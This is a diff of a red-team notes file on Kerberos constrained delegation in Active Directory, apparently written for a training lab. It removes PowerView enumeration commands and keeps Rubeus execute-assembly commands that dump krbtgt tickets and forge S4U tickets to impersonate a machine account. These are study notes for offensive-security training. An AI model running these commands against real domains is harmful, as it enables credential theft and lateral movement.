@@ -32,11 +32,6 @@ steal_token 4652
 ### Constrained Delegation
 constrained delegation takes it a step further by allowing you to configure which services an account can be delegated to.it limits delegation to a specified list, rather than allowing delegation to any service as in unconstrained delegation.
 ```
-powershell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
-powershell Get-DomainComputer web-2.cyberbotic.io | select -exp msds-AllowedToDelegateTo 
-powershell Get-DomainComputer -TrustedToAuth | select -exp dnshostname 
-powershell Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol -Verbose | fl 
-powershell Get-DomainComputer web-2.cyberbotic.io | select -exp msds-AllowedToDelegateTo #To find what services it could delegate for
 execute-assembly C:\Users\Public\Rubeus.exe triage
 execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
 execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:JOHN-PC$ /msdsspn:cifs/John-PC.acmebank.local /ticket:
